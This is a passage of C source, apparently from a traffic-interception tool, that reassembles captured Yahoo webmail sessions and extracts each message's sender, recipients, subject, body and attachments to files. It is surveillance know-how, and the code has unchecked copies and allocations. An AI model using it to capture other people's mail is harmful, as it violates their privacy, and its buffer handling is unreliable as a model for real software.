              if(pide==NULL) return -1;
                int len_id=0;
               len_id=pide-pids;
              strncpy(attach_info->ID_str,pids,len_id);
              attach_info->ID_str[len_id]=0;
                            }
	off_seq = seq - attach_info->start_seq;
	range = off_seq+datalen;
	if(range>attach_info->ok_len){
		del_attach_node(attach_info);
		delete_attach(attach_info);
		return -1;
	}

	memcpy(attach_info->ok_data + off_seq, data, datalen);

	p = strstr(attach_info->ok_data,"filename=\"");
         char *pfs = NULL;
	if (p==NULL)
		return -1;
         pfs = p;
	p = strstr(p, "\r\n\r\n");
	if (p==NULL) {
		return -1;
	}
	p += 4;
	attach_info->start_seq = pfs - attach_info->ok_data + attach_info->start_seq;//1
	result = regcompile_2(attach_info->ok_data, file_name_pattern, &attach_info->path_of_sender);//2
	if (result == -1)
		return -1;
	gettimeofday(&tv,&tz);
	sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec);//3
   // sprintf(attach_info->path_of_here, "%s/%02d-%02d-%02d-%02d", mail_temp_path, loc_time->tm_hour,loc_time->tm_min,loc_time->tm_sec,	attach_info->attach_type);//3
	mode_t file_mode = S_IRUSR | S_IWUSR |S_IRGRP|S_IROTH;
	fd=open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
	write(fd,pfs,off_seq + datalen - (pfs - attach_info->ok_data));
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing=1; //4
	return 0;
}

void analyse_yahoo_attach(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int result;
	if (is_to_s) 
	{
		if (attach_info->is_writing) 
		{
			int off_seq = seq - attach_info->start_seq;
			if (off_seq < 0) 
			{
				data_len += off_seq;
				if (data_len < 1)
					return ;
				data -= off_seq;
				off_seq = 0;
			}
			int fd = open(attach_info->path_of_here, O_RDWR);
			lseek(fd, off_seq, SEEK_SET);
			write(fd, data, data_len);
			close(fd);
		} 
		else 
		{
			analyse_yahoo_attach_head(attach_info,data,data_len,seq);
		}
	} 
	else 
	{
		if (!attach_info->is_get_ok) 
		{
			int i;
			char http_ok_head[21] = "HTTP/1.1 302 Found\r\n";

			if (!strncmp(data, http_ok_head, 17)) 
			{
				trim_attach(attach_info->path_of_here, 46);
				attach_info->ok_data = NULL;
				attach_info->is_writing = 0;
				attach_info ->is_complished = 1;

				//result = regcompile_1(data, "&diskfilename=(.*)&mimetype", attach_info->ID_str,MAX_ID_LEN);
				int len_id;
				len_id=strlen(attach_info->ID_str);
				//printf("attach_info->ID_str : %s\n", attach_info->ID_str);
				//if (result == -1) {
				//	del_attach_node(attach_info);
				//	delete_attach(attach_info);
				//}
				if(len_id==0)
				{
					del_attach_node(attach_info);
					delete_attach(attach_info);
				}
			}
		}
	}
}	

int analyse_yahoo_attach_cn_head(Attach_info *attach_info,char *data, unsigned int datalen, unsigned int seq)
{//printf("\n                          analyse_yahoo_attach_cn_head\n");
	int off_seq;
	//char file_name_pattern[]="; filename=\"(.*)\"\r\nContent-Type: ";
	//char file_name_pattern2[]="; filename=\"(.*)\"\r\nContent-Type: .*uploadfile2";
	char *p = NULL;
	int result;
	if(strstr(data, "\r\nContent-Length:"))
	{
        if (attach_info->ok_data)
        {
            free(attach_info->ok_data);
            attach_info->ok_data = NULL;
        }
    
		attach_info->ok_len = get_http_length(data) + 5000;
		attach_info->ok_data = (char *)malloc(attach_info->ok_len);
		memset(attach_info->ok_data, 0, attach_info->ok_len);
	}
	off_seq = seq - attach_info->start_seq;
	if(off_seq + datalen > attach_info->ok_len)
		return -1;
	memcpy(attach_info->ok_data + off_seq, data, datalen);

	if(!(strstr(data + datalen - 2, "--") || strstr(data + datalen -4, "--"))) return 0;
//printf("\n%s\n",attach_info->ok_data);
	p = strstr(attach_info->ok_data, "filename=\"");
	if (p==NULL)
		return 0;
	p = strstr(p,"\r\n\r\n");
	if (p==NULL)
		return 0;
	p +=4;
	attach_info->start_seq = p - attach_info->ok_data + attach_info->start_seq;

	char *p1 = NULL;
	char *p2 = NULL;
	p1 = strstr(attach_info->ok_data, "; filename=\"");
	if (p1==NULL) return 0;
	p1 += 12;
	p2 = strstr(p1, "\"\r\nContent-Type: ");
	if (p2==NULL) return 0;
	strncpy(attach_info->attach_name,p1,p2-p1);
	attach_info->attach_name[p2-p1]=0;
	/*result = regcompile_2(attach_info->ok_data,file_name_pattern2,&attach_info->path_of_sender);
	if (result ==-1)
	{
		result = regcompile_2(attach_info->ok_data,file_name_pattern,&attach_info->path_of_sender);
		if (result == -1) return -1;
	}*/
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	struct timeval tv;
	struct timezone tz;
	gettimeofday(&tv,&tz);
	snprintf(attach_info->path_of_here,MAX_PATH_LEN,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec);
	int fd = open(attach_info->path_of_here, O_RDWR | O_CREAT, file_mode);
	if(fd == -1)
		return -1;//printf("\n%d\n",off_seq + datalen - (p - attach_info->ok_data));
	if(!strncmp(attach_info->ok_data,"POST /us.",9)){//printf("\n%d\n%s\n",off_seq + datalen - (p - attach_info->ok_data),p);
		write(fd,p,off_seq + datalen - (p - attach_info->ok_data)+5);}
	else
		write(fd,p,off_seq + datalen - (p - attach_info->ok_data)-99);
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing = 1;
	/*if (attach_info->is_writing)
	{
		write_to_attach(attach_info,data,datalen,seq);
		attach_info->is_writing = 0;
	}*/
	return 0;
 
}

#if 0
int  analyse_yahoo_attach_cn_head(Attach_info  *attach_info, char *data,unsigned int datalen,unsigned int seq)
{
   int fd;
  // time_t the_time =time(NULL);
   //struct tm *loc_time = localtime(&the_time);
   struct timeval tv;
   struct timezone tz;
   int off_seq;
   int range;

   //////////// id/////////////////
  /* char  *tmp1=NULL;
   tmp1=strstr(attach_info->ok_data,"&.rand=");
   if(tmp1 != NULL) {
   tmp1 += 7;
   strncpy(attach_info->ID_str,tmp1,9);  //1
   attach_info->ID_str[9]=0;
   printf("########## rand %s  ##############\n",attach_info->ID_str);
   }*/
   ///////////////////////////////
   char *p1 = NULL;
   off_seq=seq-attach_info->start_seq;
   range = off_seq+datalen;
   if(range>attach_info->ok_len){
	   del_attach_node(attach_info);
	   delete_attach(attach_info);
	   return -1;
   }
   memcpy(attach_info->ok_data+off_seq,data,datalen);
   
   p1 = strstr(attach_info->ok_data,"filename=\"");
   if(p1==NULL) return 0;
   /////////////////id //////////////////////
   char *tmp1=NULL;
    tmp1=strstr(attach_info->ok_data,"&.rand=");
   if(tmp1!=NULL) {
	   tmp1 +=7;
	   strncpy(attach_info->ID_str,tmp1,9);
	   attach_info->ID_str[9]=0;
//	   printf("############### rand=%s###########\n",attach_info->ID_str);
   }
  
   attach_info->start_seq = p1-attach_info->ok_data+attach_info->start_seq;  //2
   gettimeofday(&tv,&tz);
   sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec);
  // sprintf(attach_info->path_of_here,"%s/%02d-%02d-%02d-%02d",mail_temp_path,loc_time->tm_hour,loc_time->tm_min,loc_time->tm_sec,attach_info->attach_type);   //3
   mode_t  file_mode = S_IRUSR| S_IWUSR|S_IRGRP|S_IROTH;
   fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
   write(fd,p1,off_seq+datalen-(p1-attach_info->ok_data));
   close(fd);
   free(attach_info->ok_data);
   attach_info->ok_data = NULL;
   attach_info->is_writing =1;

   return 0;
}
#endif



int analyse_yahoo_attach_cn(Attach_info *attach_info, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s)
{//printf("\n                    analyse_yahoo_attach_cn\n");
	unsigned int seq=ntohl(tcp->seq);
	int result;
	
	if(is_b_s)
	{
		if (!attach_info->is_writing)
		{
			//result = write_to_attach(attach_info,data,datalen,seq);
// 		}
// 		else
// 		{
			result = analyse_yahoo_attach_cn_head(attach_info,data,datalen,seq);
		}
		return result;
	}
	else if(!attach_info->is_get_ok)
	{
		char http_ok_head[21] = "HTTP/1.1 200 OK\r\n";
		char http_found_head[21] = "HTTP/1.1 302 Found\r\n";
		
		if(!strncmp(data,http_ok_head,17))
		{//4
			attach_info->recive_length = get_http_length(data);
			attach_info->recive_length += 1000;
			attach_info->recive_data = (char *)malloc(attach_info->recive_length);
			if(attach_info->recive_data == NULL)
				return -1;
			memset(attach_info->recive_data,0,attach_info->recive_length);
			char * p=strstr(data,"\r\n\r\n");
			p+=4;
			if(strstr(data,"Transfer-Encoding: chunked\r\n"))
			{
				p = strstr(p,"\r\n");
				p += 2;
			}
			memcpy(attach_info->recive_data, p, attach_info->recive_length-1000);
			if(strstr(data,"Content-Encoding: gzip") && !strncmp(data + datalen - 7, "\r\n0\r\n\r\n", 7))
			{
				char *tmp = (char *)malloc(attach_info->recive_length*30);
				memset(tmp,0,attach_info->recive_length*30);
				decomp_gzip_2(attach_info->recive_data,attach_info->recive_length-1000,&tmp);
				if(tmp == NULL) 
					return -1;
				free(attach_info->recive_data);
				attach_info->recive_data = tmp;
				attach_info->recive_length=strlen(attach_info->recive_data)+1000;
			}
			attach_info->is_writing = 0;
			attach_info->is_get_ok =1;
			result = regcompile_1(attach_info->recive_data,"<id>(.*)</id>",attach_info->ID_str,MAX_ID_LEN);
//printf("attach_info->ID_str : %s\n", attach_info->ID_str);
			if (result == -1)
			{
				return -1;
			}
			trim_attach(attach_info->path_of_here,54);
			attach_info->is_complished = 1;
			return 0;
		}//4
		if(!strncmp(data,http_found_head,20))
		{
			attach_info->is_writing = 0;
			attach_info->is_get_ok =1;
			result = regcompile_1(data,"&diskfilename=(.*),,,,&mimetype=",attach_info->ID_str,MAX_ID_LEN);
//printf("attach_info->ID_str : %s\n", attach_info->ID_str);
			if (result == -1)
			{
				return -1;
			}
			trim_attach(attach_info->path_of_here,54);
			attach_info->is_complished = 1;
			return 0;
		}
	}//3
	return -1;
}
#if 0
int analyse_yahoo_attach_cn(Attach_info *attach_info,char *data, unsigned int datalen,struct tcphdr *ptcp,int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int result;
	if ( is_to_s) {
		if(attach_info->is_writing ){
			int off_seq = seq - attach_info->start_seq;
			if (off_seq <0) {
				datalen += off_seq;
				if (datalen <1) return ;
				data -= off_seq;
				off_seq = 0;
			}
			int fd = open(attach_info->path_of_here,O_RDWR);
			lseek(fd,off_seq,SEEK_SET);
			write(fd,data,datalen);
			close(fd);
		} else {
			analyse_yahoo_attach_cn_head(attach_info,data,datalen,seq);
		}
	}else {
		if(!attach_info->is_get_ok){
			char http_ok_head[21] = "HTTP/1.1 302 Found\r\n";
			if(!strncmp(data,http_ok_head,9)){
               trim_attach(attach_info->path_of_here,46);
			   attach_info->is_get_ok = 1;
			   attach_info ->is_complished = 1;
			}

		}
	}
}
#endif

char chartoint(char x)
{
	if(x>='0'&&x<='9')
		x=x-'0';
	else if(x>='a' && x<='f'){
		x-='a';
		x+=10;
	}else if(x>='A' && x<='F'){
		x-='A';
		x+=10;
	}

	return x;
}

int get_value(char str[4])
{
   int sum=0;
   int i;
   for(i=0;i<4; i++)
   sum=sum*16+chartoint(str[i]);
   return sum;
   
  
}

int clear_tag(char *str)
{
	char *head=NULL,*end=NULL;
	char A,B,C,D;
	char x,y,z;
	char u1=0x0e;
	char u2=0x80;
	char tem[4];
	int value;
	if(str==NULL) return -1;
	head=str;
	end=head;
	while(*head!='\0'){
		if(*head=='\\'&&*(head+1)=='u'){
		         memcpy(tem,head+2,4);
		         value=get_value(tem);
		         if(value<0x0800)
		         {
		           A=((value>>6) & 0x1f) | 0xc0;
		           B=((value>>0) & 0x3f) | 0x80;
		           *(end++)=A;
		           *(end++)=B;
		         }
		         else
		         {
			A=chartoint(*(head+2));
			B=chartoint(*(head+3));
			C=chartoint(*(head+4));
			D=chartoint(*(head+5));
			x=(u1<<4)|A;
			y=u2 | (B<<2) |(C>>2);
			z=u2 | ((C&0x03)<<4) |D;
			*(end++)=x;
			*(end++)=y;
			*(end++)=z;
			}
			head+=6;
			continue;
		}else{
			if(end<head) *end=*head;
			end++;
			head++;
		}
	}
	*end='\0';

	return 0;
}
void write_yahoo_recive_file(Mail_info *mail_info)
{
   char *p1 = NULL, *p2 = NULL, *p3 = NULL;
   char *tmp_str = NULL;
   int len = 0;
   
   //decomp_gzip_1(mail_info->recive_data,mail_info->mail_length-22,&mail_info->mail_data);
   decomp_gzip_1(mail_info->recive_data,mail_info->recive_length-22,&mail_info->mail_data);//yu modyfied
   //printf("recive_data=%s\n",mail_info->mail_data); 
   if(mail_info->mail_data==NULL) 
       return;
   
   #if 0
   //find mid
   char *pmids=NULL; 
    char *pmide=NULL;
   pmids=strstr(mail_info->mail_data,"&midIndex=");
   if(pmids==NULL) return;
   pmids=strstr(pmids,"&mid=");
   if(pmids==NULL) return;
   pmids+=5;
   pmide=strstr(pmids,"&fromId");
   if (pmide==NULL) return;
   len=pmide-pmids;
   if(len < 0 || len > MAX_ID_LEN) return;
   strncpy(mail_info->mail_id,pmids,len);
   mail_info->mail_id[len]=0;
   #endif
   
   p1=strstr(mail_info->mail_data,"_view_subject\\\">");
   if(p1==NULL) return;
   p1+=16;
   p2=strstr(p1,"<\\/h1>");
   if(p2==NULL) return;
   len=p2-p1;
   if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
   strncpy(mail_info->subject,p1,len);
   mail_info->subject[len]=0;
   clear_tag(mail_info->subject);
   //printf("subject=%s\n",mail_info->subject);

   
   p1=strstr(p2,"\\\"date\\\"><nobr>");
   if(p1==NULL) return;
   p1+=15;
   p2=strstr(p1,"<\\/nobr>");
   if(p2==NULL) return;
   len=p2-p1;
   if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
   strncpy(mail_info->sent_time,p1,len);
   mail_info->sent_time[len]=0;
   //printf("sent->time=%s\n",mail_info->sent_time);
   clear_tag(mail_info->sent_time);


   p1=strstr(p2,"\\\"email\\\">");
   if(p1==NULL) return;
   p1+=10;
   p3=strstr(p1,"&lt;");
   p2=strstr(p1,"<\\/span>");
   if(p2==NULL) return;
   if(p3!=NULL&&p3<p2){
	    p3+=4;
		p2-=4;
		len=p2-p3;
		if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
		strncpy(mail_info->from,p3,len);
		mail_info->from[len]=0;

   }

   //printf("from=%s\n",mail_info->from);


   p1=strstr(p2,"\\\"details\\\">");
   if(p1==NULL){LOG_INFO("\n77\n"); return;}
   p1+=12;
   p2=strstr(p1,"<\\/div>");
   if(p2==NULL) return;
   len=p2-p1;
   if(len>MAX_TO_LEN) len=MAX_TO_LEN;
   strncpy(mail_info->to,p1,len);
   mail_info->to[len]=0;

   p3=p2;

   
   p1=strstr(p2,"role=\\\"main\\\">");
   if(p1==NULL) return;
   p1+=14;
   p2=strstr(p1,"id=\\\"contentbuttonbarbottom\\\"");
   if(p2==NULL) return;
   len=p2-p1-5;
   mail_info->content=(char *)malloc(len+1);
   if(mail_info->content !=NULL){
	   memset(mail_info->content,0,len+1);
	   memcpy(mail_info->content,p1,len);
       clear_tag(mail_info->content);
	   tmp_str=clear_html_tag(mail_info->content);
	   free(mail_info->content);
	   mail_info->content = tmp_str;
	   tmp_str = NULL;

   }

   *p1='\0';

   p1=strstr(p3,"\\\"details\\\">");
   if(p1){
		p1+=12;
        p2=strstr(p1,"<\\/div>");
        if(p2){
			len=p2-p1;
			if(len>MAX_CC_LEN) len=MAX_CC_LEN;
			strncpy(mail_info->cc,p1,len);
			mail_info->cc[len]=0;
			if(strstr(mail_info->cc,"("))
				memset(mail_info->cc,'\0',MAX_CC_LEN);
		}
   }
   //printf("content=%s\n",mail_info->content);
   create_dir(mail_info->save_path,"yahoocn",mail_info->from);
   write_to_file(mail_info);
}
int analyse_yahoo_recive(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *ptcp,int is_to_s)
{//printf("\n                   analyse_yahoo_recive\n");
	unsigned int seq=ntohl(ptcp->seq);
	int off_seq;
	int result;
	int range;
	int len;
	char *p=NULL;
	
	if(is_to_s)
	{//printf("\n1\n");
	   if(!strncmp(data, "GET /mc/showMessage",19))
	   {//printf("\n2\n");
	     char *p1, *p2;
	     int len_id;
	     p1 = data;
	     if(p1 == NULL) return -1;
	     p1 = strstr(p1,"&mid=");
	     if(p1 == NULL) return -1;
	     p1 += 5;
	     p2 = strstr(p1,"&");
	     if(p2 == NULL) return -1;
	     len_id = p2-p1;
	     if (len_id < 0 || len_id >MAX_ID_LEN) return -1;
	     
	     memcpy(mail_info->mail_id,p1,len_id);
	     mail_info->mail_id[len_id] = 0;               //printf("mail_info->mail_id1 = %s\n",mail_info->mail_id);
	     //printf("\n3\n");
	   }
	}
	else
	{//printf("\n4\n");
		if(!strncmp(data,"HTTP/1.",7))
		{//printf("\n5\n");
			mail_info->recive_length = get_http_length(data);
			if(mail_info->recive_length<=0) {//printf("\n6\n");
				return -1;
			}
			mail_info->recive_length +=20;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data ==NULL){//printf("\n7\n");
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			p=strstr(data,"\r\n\r\n");
			if(p==NULL) {//printf("\n8\n");
				return -1;
			}
			p+=4;
			p=strstr(p,"\r\n");
			if(p==NULL) {//printf("\n9\n");
				return -1;
			}
			p+=2;
			mail_info->http_seq = seq+p-data;
			len=datalen-(p-data);
			if(len>mail_info->recive_length) {//printf("\n10\n");
				return -1;
			}
			memcpy(mail_info->recive_data,p,len);
			if(!memcmp(data+datalen-4,"\r\n\r\n",4)){//printf("\n11\n");
				write_yahoo_recive_file(mail_info);
				del_mail_node(mail_info);

			}
			
		}
		else if(mail_info->recive_data != NULL)
		{
			off_seq=seq-mail_info->http_seq;
			range=off_seq+datalen;
			if(range>mail_info->recive_length){
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
			if(!memcmp(data+datalen-4,"\r\n\r\n",4)){//printf("\n12\n");
				write_yahoo_recive_file(mail_info);
				del_mail_node(mail_info);
			}
		}
	}
	return 0;
}
void write_yahoocom_recive_file(Mail_info *mail_info)
{//printf("\nwrite_yahoocom_recive_file\n");
	char *p1=NULL,*p2=NULL,*p3=NULL;
	char patternto[]="\"to\":\\[\\{\"email\":\"(.*)\",\"name\"";
	char patterncc[]="\"cc\":\\[(.*)\\],\"bcc\"";


	int len;
	char tmp[50];
	char *tmp_str=NULL;
	time_t timeint;
	struct tm  *timestring=NULL;
// 	if(strstr(mail_info->recive_data,"Content-Encoding: gzip"))
// 		decomp_gzip_1(mail_info->recive_data,mail_info->recive_length-22,&mail_info->mail_data);
// 	else{
// 		mail_info->mail_data = malloc(mail_info->recive_length+1);
// 		memcpy(mail_info->mail_data,mail_info->recive_data,mail_info->recive_length);
// 	}
// 	printf("mail_info->mail_data=%s\n",mail_info->mail_data);
// 	if(mail_info->mail_data == NULL)return;
	char *p = mail_info->recive_data;
	while(strstr(p, "mid\":\""))
	{                                          //printf("\np = %s\n",p);
		p1 = strstr(p, "mid\":\"");
		if (p1==NULL) return;
		p1+=6;
		p2=strstr(p1,"\",");
		if (p2==NULL) return;
		len=p2-p1;
		if (len > MAX_TIME_LEN) len=MAX_TIME_LEN;
		strncpy(mail_info->mail_id, p1, len);
		mail_info->mail_id[len]=0;
	//printf("mail_info->mail_id : %s\n", mail_info->mail_id);
		
		p1=strstr(p2,"sentDate\":");
		if(p1==NULL) return;
		p1+=10;
		p2=strstr(p1,",\"");
		if(p2==NULL) return;
		len=p2-p1;
		if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
		strncpy(tmp,p1,len);
		tmp[len]=0;
		timeint=atoi(tmp);
		timestring=localtime(&timeint);
		strftime(mail_info->sent_time,MAX_TIME_LEN,"%Y-%m-%d %H:%M:%S",timestring);

		p1=strstr(p2,"subject\":\"");
		if(p1==NULL) return;
		p1+=10;
		p2=strstr(p1,"\",");
		if(p2==NULL) return;
		len=p2-p1;
		if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
		strncpy(mail_info->subject,p1,len);
		mail_info->subject[len]=0;
		clear_tag(mail_info->subject);
	
		p1=strstr(p2,"from\":");
		if(p1==NULL) return;
		p1+=6;
		p2=strstr(p1,"email\":\"");
		if(p2==NULL) return;
		p2+=8;
		p1=strstr(p2,"\"");
		if(p1==NULL) return;
		len=p1-p2;
		if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
		strncpy(mail_info->from,p2,len);
		mail_info->from[len]=0;
		clear_from(mail_info->from);
		//p3=p2;
	
		p1=strstr(p2,"\"to\":");
		if(p1==NULL) return;
		p1+=5;
		p2=strstr(p1,"email\":\"");
		if(p2==NULL) return;
		p2+=8;
		p1=strstr(p2,"\"");
		if(p1==NULL) return;
		len=p1-p2;
		if(len>MAX_TO_LEN) len=MAX_TO_LEN;
		strncpy(mail_info->to,p2,len);
		mail_info->to[len]=0;
		drop_yahoo_tag(mail_info->to);
	
		p1=strstr(p2,"\"cc\":");
		if(p1!=NULL){
			p1+=7;
			if(!strncmp(p1, "\"email\":\"", 9)){
				p2=strstr(p1,"email\":\"");
				p2+=8;
				p1=strstr(p2,"\"");
				if(p1==NULL) return;
				len=p1-p2;
				if(len>MAX_CC_LEN) len=MAX_CC_LEN;
				strncpy(mail_info->cc,p2,len);
				mail_info->cc[len]=0;
				drop_yahoo_tag(mail_info->cc);
			}
		}
	
		p1=strstr(p,"part\":[{\"partId");
		if(p1==NULL) p1=strstr(p,"text\":\"");//return;
		p2=p1;
		p1=strstr(p2,"text\":\"");
		if(p1==NULL) return;
		p1+=7;
		p2=strstr(p1,"\",\"");
		if(p2==NULL) return;
		len=p2-p1;
		mail_info->content=(char *)malloc(len+1);
		if(mail_info->content!=NULL)
		{
			char *tmp_p = NULL;
			memset(mail_info->content,0,len+1);
			memcpy(mail_info->content,p1,len);
			tmp_str = conv_to_xml_symbol(mail_info->content);
			free(mail_info->content);
			mail_info->content = NULL;

			tmp_p = clear_html_tag(tmp_str);
			free(tmp_str);
			tmp_str = NULL;
			
			if(strstr(tmp_p,"\\nif (typeof YAHOO == \\\"undefined\\\")"))
			{
				tmp_str = strstr(tmp_p, ";\\n\\n");
				tmp_str += 5;
				mail_info->content = (char *)malloc(len+1);
				if (NULL == mail_info->content)
					return;
				memset(mail_info->content, 0, len+1);
				memcpy(mail_info->content, tmp_str, strlen(tmp_str));
				free(tmp_p);
				tmp_p = NULL;
			}
			else
				mail_info->content = tmp_p;

			clear_tag(mail_info->content);

// 			if(strstr(mail_info->content,"\\nif (typeof YAHOO == \\\"undefined\\\")"))
// 			{
// 				char* str = (char*)malloc(len+1);
// 				memset(str,0,len+1);
// 				memcpy(str,mail_info->content,len);
// 				p3 = strstr(str,";\\n\\n");
// 				p3 += 5;
// 				memset(mail_info->content,0,len+1);
// 				memcpy(mail_info->content,p3,len-(p3-str));
// 				str=NULL;
// 				free(str);
// 			}
		}
		//*p2='\0';
		/*regcompile_1(p3,patternto,mail_info->to,MAX_TO_LEN);
		drop_yahoo_tag(mail_info->to);
		regcompile_1(p3,patterncc,mail_info->cc,MAX_CC_LEN);
		drop_yahoo_tag(mail_info->cc);*/
		p = p1;                                          //printf("\np = %s\n",p);
	
		create_dir(mail_info->save_path,"yahoo",mail_info->from);
		write_to_file(mail_info);
	}
}
int  analyse_yahoocom_recive(Mail_info *mail_info, char *data,unsigned int data_len, struct tcphdr *ptcp,int is_b_s)
{//printf("\nanalyse_yahoocom_recive\n");
	unsigned int seq=ntohl(ptcp->seq);
	int off_seq;
	int result;
	int range;
	char *p=NULL;
	char *dest = NULL;
	int len;
	static int flag = -1;
	static int flagg = -1;

	if(!is_b_s){
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{//printf("\n4\n");
			if(strstr(data, "Content-Encoding: gzip"))
				flag = 1;
			else
				flag = 0;
			if(strstr(data, "Transfer-Encoding: chunked\r\n"))
				flagg = 1;
			else
				flagg = 0;
		}
		if (!mail_info->is_complished) 
		{
			if(flagg == 0)
			{
				//printf("\ngzip ...\n");
				result = write_chunked_okdata(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 0;
			}
			else
			{
				//printf("\nchunked ...\n");
				result = write_to_okdata_chunked_gzip(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 1;
			}
			if (result == -1)
				return -1;
		}
		if (!memcmp(data + data_len - 5, "0\r\n\r\n", 5)) 
		{
			mail_info->is_complished = 1;
			if(flag == 1)
			{
				if (mail_info->is_ok_chunked)
				{
					mail_info->recive_length = Chunked(mail_info);
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length, &dest);
						}
					}
				}
				else
				{
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length - 2, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length - 2, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						}
					}
				}
                
				if (result == -1)
				{
					LOG_WARN("webmail:analyse_yahoo_rcvmail1: decomp_zip return error!\n");
					return -1;
				}
                
				free(mail_info->recive_data);
				mail_info->recive_data = dest;         //printf("\nmail_info->recive_data = %s\n",mail_info->recive_data);
				dest = NULL;
			}
			write_yahoocom_recive_file(mail_info);
			del_mail_node(mail_info);
			return 0;
		}

		/*if(!strncmp(data,"HTTP/1.",7)){
			mail_info->recive_length=get_http_length(data);
			if(mail_info->recive_length<=0){
				return -1;
			}
			mail_info->recive_length +=5000;
			mail_info->recive_data = malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL){
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			p=strstr(data,"\r\n\r\n");
			if(p==NULL){
				return -1;
			}
			p+=4;
			p=strstr(p,"\r\n");
			if(p==NULL){
				return -1;
			}
			p+=2;
			mail_info->http_seq = seq+p-data;
			len=datalen-(p-data);
			if(len>mail_info->recive_length) {
				return -1;
			}
			memcpy(mail_info->recive_data,p,len);
			if(!memcmp(data+datalen-5,"0\r\n",3)){
				write_yahoocom_recive_file(mail_info);
				del_mail_node(mail_info);
			}
		} else if(mail_info->recive_data !=NULL){
			off_seq=seq-mail_info->http_seq;
			range=off_seq+datalen;
			if(range>mail_info->recive_length){
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
			if(!memcmp(data+datalen-5,"0\r\n",3)){
				write_yahoocom_recive_file(mail_info);
				del_mail_node(mail_info);
			}
		}*/
	}
	return 0;
}

int analyse_yahoo_attach_mail(Mail_info *mail_info,char *data, unsigned int datalen, struct tcphdr *tcp,int is_b_s)
{//because the attach and the mail body is sent separately, 
 //so this function is used to analyse the attachfile
 unsigned int seq=ntohl(tcp->seq);
 int off_seq=seq-mail_info->start_seq;
 int range;
 char http_found_head[21]="HTTP/1.1 302 Found\r\n";
 
 if (is_b_s)
 {
   if(!mail_info->is_complished)
     {
      if(mail_info->mail_length==0)
       {
        mail_info->mail_length=5000;
        mail_info->mail_data=(char *)malloc(5000);
       if (mail_info->mail_data==NULL)
         {
           return -1;
         }
         memset(mail_info->mail_data,0,5000);
         mail_info->start_seq=seq;
       }
        if(mail_info->mail_length==5000)
          {
            int len;
            char *tmp;
            len=get_http_length(data);
            if (len>0)
              {
                mail_info->mail_length+=len;
                tmp=(char *)malloc(mail_info->mail_length);
                if (tmp==NULL)
                  {
                    return -1;
                   }
                  memset(tmp,0,mail_info->mail_length);
                  memcpy(tmp,mail_info->mail_data,5000);
                  free(mail_info->mail_data);
                  mail_info->mail_data=tmp;
               }
            }
         off_seq=seq-mail_info->start_seq;
         range=off_seq+datalen;
           if(range>mail_info->mail_length)
            {
              return -1;
            }
          memcpy(mail_info->mail_data+off_seq,data,datalen);
          }
       }
       else if (!strncmp(data,http_found_head,18))
       {
               mail_info->is_complished=1;
               //how to dispose it ?not decided.
               
               mail_info_yahoo_attach=mail_info;
               //store the attachment information
       }
	return 0;
}

#if 0

int write_yahoo_attach_down(Mail_info *mail_info, unsigned int length, int is_chunk)
{
   mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
   char *p1 = mail_info->recive_data;
   char *p2;
   char filename[MAX_FN_LEN]="0";
   int len; 
   char tmpname[MAX_FN_LEN]="0"; 
   char *pzip_judge = NULL;
   char *p4 = NULL;
   p4 = strstr(p1,"\r\n\r\n");
   if (p4==NULL) return;
   unsigned int n=p4-p1;
   int ngz=0;
   pzip_judge = memfind(p1,"Content-Encoding: gzip\r\n", n);
   
   p2 = strstr(p1,"attachment; filename=\"");
   if(p2==NULL)
     return;
   p1 = p2;
   p1 += 22;
   p2 = strstr(p1,"\"\r\n");
   {
     if(p2==NULL)
        p2=strstr(p1,"\";\r\n");
     if (p2==NULL)
         return;
     
    }
   len = p2-p1;
   if(len>MAX_FN_LEN) len=MAX_FN_LEN;
   strncpy(tmpname,p1,len);
   tmpname[len] = 0;
   htmldecode_full(tmpname,filename);
   
   p1 = strstr(p2, "\r\n\r\n");
   if(p1==NULL) return ;
   p1 +=4;
   
   char str[MAX_PATH_LEN];
   struct timeval tv;
   struct timezone tz;
